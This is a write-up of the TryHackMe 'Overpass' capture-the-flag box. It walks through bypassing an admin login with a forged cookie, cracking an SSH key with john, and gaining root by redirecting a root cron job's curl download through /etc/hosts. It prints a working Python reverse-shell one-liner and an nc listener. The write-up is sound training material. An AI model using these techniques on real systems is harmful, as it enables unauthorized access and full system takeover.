## Overpass is a CTF box written by NinjaJc01 and available on the [TryHackMe](https://tryhackme.com/) platform.
## Read about [Broken Authentication](https://www.youtube.com/watch?v=mruO75ONWy8), [OWASP A2](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication)

## Foothold
+ **Let's start with a nmap scan for ports**

``nmap -sV -sC -oN scan1 10.10.107.5``

+ **We can clearly see 2 ports open, ssh and a http, configured on default ports**

# ![1](images/nmap_scan_ov_1.jpg?raw=true "nmap_scan")

+ **Visiting the http web-site, we are welcomed by a page which contains info about a specific password-manager app built by some developers. We also see a download link button**

# ![2](images/visited.jpg?raw=true "visit")

**Accessing the download page, we can look through the Source code of the password-manager app. It looks like it's written in go language which encrypt passwords with the ROT47 algorithm**

+ **Let's do a gobuster scan of the web site**

``gobuster dir -u http://10.10.107.5/ -w /usr/share/wordlists/dirb/big.txt``

# ![3](images/admin.jpg?raw=true "admin")

+ **We can spot an admin page and accessing it, we can see an administrator login area. I tried, unsuccessfully, a SQL injection and then moved on the 2nd OWASP vuln. Let's look into the source code of the page and into some js code**

# ![4](images/scripts.jpg?raw=true "scripts")

**We can clearly see a login.js script so let's look into the source code. The login function seems to be a way to go**

```js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
```

+ **The credentials of the login page are sent to a endpoint inside some DB of the box and a session token is used. It seems like the session token is set with the statusOrCookie parameter. If we change the SessionToken value, maybe we can bypass the login. Let's create the cookie with the name of *SessionToken* and any value you want inside it**

# ![5](images/session.jpg?raw=true "sess")

## User escalation

**Now, trying to refresh the page we can observe we bypassed the login auth and a RSA private key of some guy named James is on our screen. Let's save it in some txt file and use it to connect to ssh**

# ![6](images/RSA.jpg?raw=true "rsa")

``chmod 600 id_rsa``

``ssh -i id_rsa james@10.10.107.5``

+ **Trying to connect to ssh, a key is required for our file. Let's use ssh2john to bruteforce our way in: i'm gonna use ssh2john to get our first hash then crack it with john using the rockyou.txt wordlist**

``python ssh2john.py id_rsa > key_hash``

``sudo john key_hash -wordlist=/usr/share/wordlists/rockyou.txt``

# ![7](images/johned.jpg?raw=true "johnny")

**Using our password for the ssh we are in! There's two files into user's home directory: one of them is our user's flag and the other seems to be an update of their encryption app**

# ![8](images/userflag.jpg?raw=true "userfl")

## Root escalation

+ **According the message inside the todo.txt file, we can see that james is using the same app to encrypt his password. Listing the hidden files inside his directory we can see another file named** *.overpass* **It seems to be james password so we're gonna use it, but first don't forget to decrypt it, because it's encrypted with ROT47, as they said in the beginning page**

**Running sudo -l command, we cannot se any allowed cmds for james user**

# ![9](images/noturn.jpg?raw=true "noturn")

+ **Let's continue and look into the /etc/crontab file**

``cat /etc/crontab``

# ![10](images/croned.jpg?raw=true "crontab")

+ **We can see a curl command, executed by root, which runs every minute and transfer the data from the *buildscript.sh*, the building script for their encrypting app, into terminal, then executed by bash. This script is taken from the machine local web-site, and the domain used is overpass.thm. If we look into the /etc/hosts file we can see the overpass.thm dns belongs to the local ip of the machine**

# ![11](images/hostsetc.png?raw=true "hostsetc")

+ **What if we can run our own script on this machine? If we modify the overpass.thm domain into our local machine domain, we can host locally a python server and upload maybe a python script which get us a reverse shell. The respective script is executed by root so we're gonna get a root shell**

# ![12](images/modfiy.jpg?raw=true "modify")

**Next step is to create a similar path with the /etc/crontab curl get request from the host - */downloads/src/buildscript.sh*. Let's do this into our local machine and we're gonna host the server into our home directory**

``mkdir downloads``

``mkdir src``

**Now, let's create the *buildscript.sh***

``python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'``

# ![13](images/pythoned.jpg?raw=true "pyth")

+ **The last step is to start our server from the home directory (on the 80 port) and then start a listener with nc**

``sudo python -m SimpleHTTPServer 80``

``nc -lvnp 1234``

# ![14](images/root_flagos.jpg?raw=true "flagos")

**And we are root! It was a nice box with a very important vulnerability based on the Broken Authentication and some exploiting crontab service**
